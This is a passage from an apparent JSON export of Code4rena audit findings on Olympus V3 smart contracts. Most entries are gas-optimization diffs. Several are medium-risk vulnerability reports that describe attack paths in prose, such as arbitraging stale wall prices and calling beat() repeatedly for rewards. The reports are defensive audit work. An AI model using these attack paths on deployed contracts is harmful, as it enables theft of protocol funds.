token.safeTransfer(address(_TRSRY), balance);              priorBalances[token] = token.balanceOf(address(this));                unchecked { ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol 1. Use local variable instead of read from memory ``` git diff diff --git a/src/policies/Governance.sol b/src/policies/Governance.sol index 8829e3b..31fc309 100644 --- a/src/policies/Governance.sol +++ b/src/policies/Governance.sol @@ -275,7 +275,9 @@ contract OlympusGovernance is Policy {            Instruction[] memory instructions = INSTR.getInstructions(activeProposal.proposalId);   -        for (uint256 step; step < instructions.length; ) { +        // Use local variable instead of read from memory +        uint256 _len = instructions.length; +        for (uint256 step; step < _len; ) {              kernel.executeAction(instructions[step].action, instructions[step].target);              unchecked {                  ++step; ```"}, {"title": "Solmate safetransfer and safetransferfrom doesnot check the codesize of the token address, which may lead to fund loss", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/117", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L110 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L99   # Vulnerability details  ## Impact In `getloan()` and `replayloan()`, the `safetransfer` and `safetransferfrom` doesn't check the existence of code at the token address. This is a known issue while using solmate's libraries.  Hence this may lead to miscalculation of funds and may lead to loss of funds , because if `safetransfer()` and `safetransferfrom()` are called on a token address that doesn't have contract in it, it will always return success, bypassing the return value check. Due to this protocol will think that funds has been transferred and successful , and records will be accordingly calculated, but in reality funds were never transferred.  So this will lead to miscalculation and possibly loss of funds  ## Proof of Concept https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L110 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L99  ## Tools Used Manual code review  ## Recommended Mitigation Steps Use openzeppelin's safeERC20 or implement a code existence check  "}, {"title": "Admin cannot be changed to EOA after deployment", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/94", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L252-L253 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L52   # Vulnerability details  ## Impact After contracts are deployed and initialized, the admin address in `Kernel` contract can only be set to a contract. Granting and revoking roles will be possible to do only via a contract, which looks like an unintended behavior since these operations cannot be performed via governance (the governance contract is designed to be the only executor).   ## Proof of Concept Admin address can be changed to any address (EOA or contract) in the `executeAction` function in `Kernel`: https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L252-L253  This piece explicitly allows EOA addresses since the other actions in the function (besides `ChangeExecutor`) are checked to have only a contract as the target (see `ensureContract` function calls in the other actions). This, and the fact that roles cannot be managed via governance, leads to the conclusion that an admin is designed to be an EOA.  However, in the `store` function in `INSTR`, action target can only be a contract: https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L52  After the contracts are deployed, `INSTR` will be the only contract that's allowed to call `Kernel.executeAction`: https://github.com/code-423n4/2022-08-olympus/blob/main/src/scripts/Deploy.sol#L220  Thus, there will be no way to change admin to an EOA. If admin needs to be an EOA, the `INSTR` contract needs to be patched and re-deployed to allow non-contract targets.  ## Tools Used  ## Recommended Mitigation Steps Allow EOA addresses as instruction targets or disallow non-contract admin addresses."}, {"title": "Protocol's Walls / cushion bonds remain active even if heart is not beating", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/89", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L188-L191 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L272 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L346   # Vulnerability details  ## Description The Walls of the RBS mechanism offer zero slippage swaps at the high and low of the moving average spread. The capacity to be swapped at these prices is usually very large, so it must make sure to only be enabled when the prices are guaranteed to be synced. However, there is no such check. If beat() is not called for some time, meaning we cannot determine if the current spread is legit, swap() still operates as usual.   ## Impact The worst case scenario is that the wall is swapping at a losing price, meaning they can be immediately drained via arbitrage bot.   ## Proof of concept  1. Price is X at the start  2. Oracle stops updating for some reason / no one calls beat()  3. Price drops to Y , where Y < low wall centered around X  4. Attacker can perform arbitrage by buying Ohm at external markets at Y and selling Ohm at low wall price, netting the difference.  ## Recommended mitigation steps: Change modifier onlyWhileActive to add a check for beat out of sync: ``` if (block.timestamp > lastBeat + SYNC_THRESHOLD * frequency()) ```  "}, {"title": "Heart::beat() could be called several times in one block if no one called it for a some time", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/79", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L92 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103   # Vulnerability details  ## Impact `beat()` function is allowed to be called by anyone once in `frequency()` period. The purpose of it is to update the prices and do another operations related to bond market. User who ran it are rewarded. There is no need to run this function more then 1 time in `frequency()` period. However if `beat()` was last time called more then `frequency()` time ago then user can execute `beat()` function `(block.timestamp - lastBeat)/frequency()` times in a row in same block and get rewards.  ## Proof of Concept https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L92 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103   ## Recommended Mitigation Steps https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103 Change this line to `lastBeat = block.timestamp - (block.timestamp - lastBeat) % frequency();` So no matter how much time the `beat()` was no called, it is possible to call it only once per `frequency()`. "}, {"title": "TRSRY susceptible to loan / withdraw confusion", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/75", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L64-L102   # Vulnerability details  ## Impact Treasury allocates approvals in the withdrawApproval mapping which is set via setApprovalFor(). In both withdrawReserves() and in getLoan(), _checkApproval() is used to verify user has enough approval and subtracts the withdraw / loan amount. Therefore, there is no differentiation in validation between loan approval and withdraw approval. Policies which will use getLoan() (currently none) can simply withdraw the tokens without bookkeeping it as a loan.  ## Proof of Concept 1. Policy P has getLoan permission 2. setApprovalFor(policy, token, amount) was called to grant P permission to loan amount 3. P calls withdrawReserves(address, token, amount) and directly withdraws the funds without registering as loan  ## Recommended Mitigation Steps A separate mapping called loanApproval should be implemented, and setLoanApprovalFor() will set it, getLoan() will reduce loanApproval balance.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/59", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": " # Olympus V3 Findings  ### **Repo that implements suggested changes:** [0xClandestine/2022-08-olympus](https://github.com/0xClandestine/2022-08-olympus)  **Severity:** *Gas Optimization*  **Context:** [INSTR.sol#L44](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/INSTR.sol#L44), [PRICE.sol#144](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L144), [PRICE.sol#135](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#135), [Governance.sol#L251](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L251), [Heart.sol#L92](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L92)   **Description:** Arithmetic checks aren't necessary when logic cannot realistically underflow/overflow.  **Recommendation:**  [INSTR.sol#L44](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/INSTR.sol#L44) ```solidity -    uint256 instructionsId = ++totalInstructions; +    uint256 instructionsId; + +    unchecked { +        instructionsId = ++totalInstructions; +    } ```  **Recommendation:**  [PRICE.sol#144](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L144) ```solidity +    uint256 nextObs = nextObsIndex; // should cache this value  ...  -    nextObsIndex = (nextObsIndex + 1) % numObs; + +    unchecked { +        ++nextObs; +    } + +    nextObsIndex = nextObs % numObs; ```  **Recommendation:**  [PRICE.sol#135](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L135) ```solidity      // overflow/underflow is impossible here because the conditional explicitly checks the arithmetic.     if (currentPrice > earliestPrice) { -        _movingAverage += (currentPrice - earliestPrice) / numObs; + +        unchecked { +            priceDelta = currentPrice - earliestPrice; +        } + +        _movingAverage += priceDelta / numObs;     } else { -        _movingAverage -= (earliestPrice - currentPrice) / numObs; + +        unchecked { +            priceDelta = earliestPrice - currentPrice; +        } + +        _movingAverage -= priceDelta / numObs; +    } ```  **Recommendation:** [Governance.sol#L251](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L251)  ```solidity -    if (for_) { -        yesVotesForProposal[activeProposal.proposalId] += userVotes; -    } else { -        noVotesForProposal[activeProposal.proposalId] += userVotes; -    }      +    // total votes cannot exceed totalSupply +    unchecked { +        if (for_) { +            yesVotesForProposal[activeProposal.proposalId] += userVotes; +        } else { +            noVotesForProposal[activeProposal.proposalId] += userVotes; +        } +    } ```  **Recommendation:** [Heart.sol#L92](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L92)  **Note:** Consider setting lastBeat + frequency as an unchecked variable to avoid calculating it 3 times.  ```solidity function beat() external nonReentrant {     if (!active) revert Heart_BeatStopped();  -    if (block.timestamp < lastBeat + frequency())  -        revert Heart_OutOfCycle();  +   unchecked { +       if (block.timestamp < lastBeat + frequency())  +            revert Heart_OutOfCycle(); +   }      // Update the moving average on the Price module     PRICE.updateMovingAverage();      // Trigger price range update and market operations     _operator.operate();      // Update the last beat timestamp -    lastBeat += frequency();  +    unchecked { +        lastBeat += frequency(); +    }      // Issue reward to sender     _issueReward(msg.sender);      emit Beat(block.timestamp); } ``` ___  **Severity:** *Gas Optimization*  **Context:** [PRICE.sol#L252](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L252), [PRICE.sol#L284](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L284)  **Description:** Use [delete](https://docs.soliditylang.org/en/v0.8.0/types.html#delete) keyword when mutating state variables back to null/zero value to receive a gas refund.  **Recommendation:**  [PRICE.sol#L252](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L252) ```solidity -    initialized = false; -    lastObservationTime = 0; -    _movingAverage = 0; -    nextObsIndex = 0;  +    delete initialized; +    delete lastObservationTime; +    delete _movingAverage; +    delete nextObsIndex; ```  **Recommendation:**  [PRICE.sol#L284](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L284) ```solidity -    initialized = false; -    lastObservationTime = 0; -    _movingAverage = 0; -    nextObsIndex = 0;  +    delete initialized; +    delete lastObservationTime; +    delete _movingAverage; +    delete nextObsIndex; ```  ___  **Severity:** *Gas Optimization*  **Context:** [Governance.sol#L278](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278), [PRICE.sol#L122](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L122), [Heart.sol#L92](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L92)  **Description:** Cache state variables and array lengths before readings them multiple times (like in a loop).  **Recommendation:** [Governance.sol#L278](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278) ```solidity -    for (uint256 step; step < instructions.length; ) {      +    uint256 instructionsLength = instructions.length; + +    for (uint256 step; step < instructionsLength;) { ```  **Recommendation:** [PRICE.sol#L122](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L122) ```solidity  // 2 SLOADs saved  function updateMovingAverage() external permissioned {     // Revert if not initialized     if (!initialized) revert Price_NotInitialized();      // Cache number of observations to save gas.     uint32 numObs = numObservations;  +    // Cache next observation index to save gas. +    uint256 nextObs = nextObsIndex; // avoid SLOADs      // Get earliest observation in window -   uint256 earliestPrice = observations[nextObsIndex]; +   uint256 earliestPrice = observations[nextObs]; // avoid SLOAD      uint256 currentPrice = getCurrentPrice();      // Calculate new moving average     if (currentPrice > earliestPrice) {         _movingAverage += (currentPrice - earliestPrice) / numObs;     } else {         _movingAverage -= (earliestPrice - currentPrice) / numObs;     }      // Push new observation into storage and store timestamp taken at -    observations[nextObsIndex] = currentPrice; +    observations[nextObs] = currentPrice; // avoid SLOAD     lastObservationTime = uint48(block.timestamp); -    nextObsIndex = (nextObsIndex + 1) % numObs; +    nextObsIndex = (nextObs + 1) % numObs; // avoid SLOAD      emit NewObservation(block.timestamp, currentPrice, _movingAverage); } ```   **Recommendation:** [Heart.sol#L92](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L92)  ```solidity  // 2 SLOADs saved  function beat() external nonReentrant {     if (!active) revert Heart_BeatStopped();  +    uint256 _lastBeat = lastBeat;  -    if (block.timestamp < lastBeat + frequency()) revert Heart_OutOfCycle(); +    if (block.timestamp < _lastBeat + frequency()) revert Heart_OutOfCycle();      // Update the moving average on the Price module     PRICE.updateMovingAverage();      // Trigger price range update and market operations     _operator.operate();      // Update the last beat timestamp -    lastBeat += frequency(); +    lastBeat = _lastBeat + frequency(); // += causes another SLOAD      // Issue reward to sender     _issueReward(msg.sender);      emit Beat(block.timestamp); }  ``` ___  **Severity:** *Gas Optimization*  **Context:** [Governance.sol#L194](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L194)  **Description:** Mutating a single slot multiple times in a function should be avoided when possible.  **Recommendation:** [Governance.sol#L194](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L194)  **Note:** a = a + b or a = a - b is slightly cheaper than a += b or a -= b when mutating mappings. This can be applied other places in the codebase as well.  ```solidity  // 1 SSTORE saved  function endorseProposal(uint256 proposalId_) external {     uint256 userVotes = VOTES.balanceOf(msg.sender);      if (proposalId_ == 0) {         revert CannotEndorseNullProposal();     }      Instruction[] memory instructions = INSTR.getInstructions(proposalId_);     if (instructions.length == 0) {         revert CannotEndorseInvalidProposal();     }      // undo any previous endorsement the user made on these instructions     uint256 previousEndorsement = userEndorsementsForProposal[proposalId_][msg.sender]; -    totalEndorsementsForProposal[proposalId_] -= previousEndorsement;      // reapply user endorsements with most up-to-date votes     userEndorsementsForProposal[proposalId_][msg.sender] = userVotes; -    totalEndorsementsForProposal[proposalId_] += userVotes; +    totalEndorsementsForProposal[proposalId_] = totalEndorsementsForProposal[proposalId_] - previousEndorsement + userVotes; // this can potentially be unchecked      emit ProposalEndorsed(proposalId_, msg.sender, userVotes); } ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/58", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": " ## 1. ++i costs less gas compared to i++ or i += 1, same for --i/i--. Especially in for loops  `++i` costs less gas compared to `i++` or `i += 1` for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.  `i++` increments i and returns the initial value of `i`.  ``` uint i = 1;   i++; // == 1 but i == 2 ``` But ++i returns the actual incremented value: ``` uint i = 1;   ++i; // == 2 and i == 2 too, so no need for a temporary variable   ``` In the first case, the compiler has to create a temporary variable (when used) for returning 1 instead of 2  I suggest using ++i instead of i++ to increment the value of an uint variable.  If done inside for loop, saves 6 gas per loop.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol ``` 49:         i++; 64:         i++; ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol ``` 488:        decimals++; 670:        _status.low.count++; 675:        _status.low.count--; 686:        _status.high.count++; 691:        _status.high.count--; ```  ## 2. Use a more recent version of solidity  - Use a solidity version of at least 0.8.0 to get overflow protection without SafeMath   - Use a solidity version of at least 0.8.2 to get compiler automatic inlining   - Use a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads   - Use a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than `revert()/require()` strings   - Use a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value   https://github.com/code-423n4/2022-08-olympus/blob/main/src/interfaces/IBondCallback.sol  ``` 2:   pragma solidity >=0.8.0; ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IHeart.sol ``` 2:   pragma solidity >=0.8.0; ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol ``` 2:   pragma solidity >=0.8.0;  ```  ## 3. No need to explicitly initialize variables with default values  If a variable is not set/initialized, it is assumed to have the default value (0 for uint, false for bool, address(0) for address\u2026). Explicitly initializing it with its default value is an anti-pattern and wastes gas.  As an example: `for (uint256 i = 0; i < reqLength;) {` should be replaced with for `(uint256 i; i < reqLength;) {`  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol ```  397:       for (uint256 i = 0; i < reqLength; ) { ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol ``` 43:       for (uint256 i = 0; i < 5; ) { 58:      for (uint256 i = 0; i < 32; ) { ```  ## 4. \\<x\\> += \\<y\\> costs more gas than \\<x\\> = \\<x\\> + \\<y\\> for state variables  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol ``` 96:         reserveDebt[token_][msg.sender] += amount_; 97:         totalDebt[token_] += amount_; 131:        if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt; ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol ``` 136:        _movingAverage += (currentPrice - earliestPrice) / numObs; 222:        total += startObservations_[i]; ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol ``` 58:          balanceOf[to_] += amount_; ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol ``` 143:        _amountsPerMarket[id_][0] += inputAmount_; 144:        _amountsPerMarket[id_][1] += outputAmount_; ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol ``` 103:        lastBeat += frequency(); ``` https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol ``` 198:        totalEndorsementsForProposal[proposalId_] += userVotes; 252:        yesVotesForProposal[activeProposal.proposalId] += userVotes; 254:        noVotesForProposal[activeProposal.proposalId] += userVotes; ```  ## 5. \\<array>.length should not be looked up in every loop of a for-loop  The overheads outlined below are PER LOOP, excluding the first loop  - storage arrays incur a Gwarmaccess (100 gas) - memory arrays use MLOAD (3 gas) - calldata arrays use CALLDATALOAD (3 gas)  Caching the length changes each of these to a DUP\\<N> (3 gas), and gets rid of the extra DUP\\<N> needed to store the stack offset  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol ``` 279:        for (uint256 step; step < instructions.length; ) { ```  ## 6. Boolean comparisons  Comparing to a constant (true or false) is a bit more expensive than directly checking the returned boolean value. I suggest using if(directValue) instead of if(directValue == true)  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol ``` 223:        if (proposalHasBeenActivated[proposalId_] == true) { 306:        if (tokenClaimsForProposal[proposalId_][msg.sender] == true) { ```  ## 7 . Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead  When using elements that are smaller than 32 bytes, your contract\u2019s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.  There are uint8, uint32, uint48 in almost all contracts in scope, they should all be checked and if possible use uint/int. Example: https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol - 31, 32, 33 ```         31:   uint32 count; // current number of price points that count towards regeneration 32:         uint48 lastRegen; // timestamp of the last regeneration 33:         uint32 nextObservation; // index of the next observation in the observations array ```  ## 8. Using bools for storage incurs overhead  // Booleans are more expensive than uint256 or any type that takes up a full // word because each write operation emits an extra SLOAD to first read the // slot's contents, replace the bits taken up by the boolean, and then write // back. This is the compiler's defense against contract upgrades and  // pointer aliasing, and it cannot be disabled.  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27  Use uint256(1) and uint256(2) for true/false  All contracts should be checked and if possible avoid using uint instead of bools Example: https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol - 113, 181, 197 ``` 113:    bool public isActive; 181:    mapping(Keycode => mapping(Policy => mapping(bytes4 => bool))) public modulePermissions; 197:    mapping(Role => bool) public isRole; ```  ## 9. Not using the named return variables when a function returns, wastes deployment gas  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol ``` 493:        return decimals - int8(PRICE.decimals()); ```  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol ``` 122:        return uint256(PRICE.observationFrequency()); ```  ## 10. Multiplication/division by two should use bit shifting   \\<x> * 2 is equivalent to \\<x> << 1 and \\<x> / 2 is the same as \\<x> >> 1. The MUL and DIV opcodes cost 5 gas, whereas SHL and SHR only cost 3 gas  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol - 372, 419, 420, 427, 786 ``` 372:            int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2); 419:            uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price; 420:            uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price; 427:            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2); 786:            ) * (FACTOR_SCALE + RANGE.spread(true) * 2)) / ```  "}, {"title": "Unexecutable proposals when Actions.MigrateKernel is not last instruction", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/51", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/INSTR.sol#L61   # Vulnerability details  ## Impact & Proof Of Concept In `INSTR.sol`, it is correctly checked that a `ChangeExecutor` instruction only occurs at the last position to avoid situations where the other instructions are deemed as invalid. However, the same problem can occur for `MigrateKernel`. For instance, let's say we have a `MigrateKernel` followed by a `DeactivatePolicy` action. The `MigrateKernel` action will change the value of `kernel` within the policy. The `DeactivatePolicy` action tries to call `setActiveStatus` on the policy. However, this has a `onlyKernel` modifier and the call will therefore fail when it is done after the value of `kernel` was changed.  ## Recommended Mitigation Steps Perform the same check for `MigrateKernel`."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/46", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "# Low effect on readability  ## [G-01] Use `!= 0` instead of `> 0` for unsigned integers. A `uint` can't be below zero, so `!= 0` is sufficient and is gas more efficient.  1 instance: - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L247  Consider replacing `>` by `!=`.  *save 3 gas*  ## [G-02] Unnecessary initialization of variable  Some data type have a default value which is already the desired one. The default value of `uint` is `0`, it is so unnecessary to initialize these again.  3 instances: - https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L397 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L43 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L58  Consider removing `= 0`  *save 3 gas each*  ## [G-03] Transformation of post-increment to pre-increment A pre-increment is cheaper than a post one. When it is possible, it is a good practice to apply pre-increment.  5 instances: - https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L49 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L64 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L488 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L670 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L686  Consider transforming those.  With those changes, these evolutions in gas average report can be observe:      Operator: operate: 122263 -> 122255 (-8)  ## [G-04] Expression like `x = x + y` are cheaper than `x += y` for states variables.  4 instances: - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L135-L139 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L222 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103  Consider replacing `+=` and `-=`   With those changes, these evolutions in gas average report can be observe:      OlympusPrice: Deployment: 1117743 -> 1115143 (-2600)     OlympusHeart: Deployment: 934119 -> 932719 (-1400)     OlympusHeart: beat: 29228 -> 29221 (-7)  ## [G-05] Some operations can be marked unchecked If an operation can't overflow, it is cheaper to mark it as unchecked to avoid the automatic check of overflow. In this case:      while  (price_ >=  10)  {   price_ = price_ /  10;   decimals++;  } The operation can't overflow or undeflow  1 instances  - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L486-L489   Consider marking it unchecked  With this changes, these evolutions in gas average report can be observe:      Operator: Deployment: 4679925 -> 4670317 (-9608)     Operator: operate: 122263 -> 121936 (-327)  This part can already be subjected to two improvements, however this one is still largely ineffective, especially for large numbers up to 2^256. It would be very useful to import a log10 function from an external mathematical library. The gain can be very important.  ## [G-06] Unnecessary public constant Declaring a private constant is cheaper than a public one. In some case, a constant can be declared as private to save gas. It is the case if the constant don't need to be called outside the contract. A user could still read the value directly in the code instead of calling it, if needed.  8 instances: - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L65 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L121-L137 - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L89  Consider changing those constants to private. (The code still pass all the test with these changes.)  With those changes, these evolutions in gas average report can be observe:      OlympusRange: Deployment: 1125279 -> 1121272 (-4007)     OlympusRange: spread: 655 -> 545 (-110)     OlympusGovernance: Deployment: 1638243 -> 1604601 (-33642)     OlympusGovernance: activateProposal: 52753 -> 52730 (-23)     OlympusGovernance: configureDependencies: 48513 -> 48490 (-23)     OlympusGovernance: endorseProposal: 39015 -> 39037 (+22)     OlympusGovernance: executeProposal: 171376 -> 171467 (+91)     OlympusGovernance: getMetadata: 2195 -> 2172 (-23)     OlympusGovernance: isActive: 696 -> 740 (+44)     OlympusGovernance: noVotesForProposal: 549 -> 571 (+22)     OlympusGovernance: proposalHasBeenActivated:486 -> 463 (-23)     OlympusGovernance: reclaimVotes: 10009 -> 9927 (82)     OlympusGovernance: requestPermissions: 2953 -> 2997 (+44)     OlympusGovernance: tokenClaimsForProposal: 684 -> 728 (+44)     OlympusGovernance: totalEndorsementsForProposal: 529 -> 506 (-23)     OlympusGovernance: userEndorsementsForProposal: 727 ->  639 (-88)     OlympusGovernance: userVotesForProposal: 662 -> 706 (-23)     OlympusGovernance: vote: 61568 -> 61612 (+44)     OlympusGovernance: yesVotesForProposal: 506 -> 483 (-23)     Operator: Deployment: 4679925 -> 4671717 (-8208)     Operator: auctioneer: 437 -> 372 (-65)     Operator: callback: 439 -> 372 (-67)     Operator: config: 1224 -> 1246 (+19)     Operator: configureDependencies: 121016 -> 121038 (+22)     Operator: fullCapacity: 5237 -> 5204 (-33)     Operator: initialize: 316017 -> 315844 (-173)     Operator: initialized: 1356 -> 1379 (+23)     Operator: isActive: 439 -> 373 (-66)     Operator: operate: 122263 -> 122281 (+18)     Operator: regenerate: 17622 -> 17612 (-10)     Operator: requestPermissions: 6634 -> 6656 (+22)     Operator: setBondContracts: 5267 -> 5289 (+22)     Operator: setRegenParams: 11480 -> 11413 (-67)     Operator: setSpreads: 9650 -> 9672 (+22)     Operator: setThresholdFactor: 12113 -> 12135 (+22)     Operator: status: 8988 -> 9010 (+22)     Operator: swap: 54322 -> 54342 (+20)     Operator: toggleActive: 7460 -> 7482 (+22)  ## [G-07] Using `storage` instead of `memory`  can be cheaper.  A `storage` structure is pre allocated by the contract, by contrast, a `memory` one is newly created. Depending on the case both can be used to optimize the gas cost because simply, a `storage` is cheaper to create but 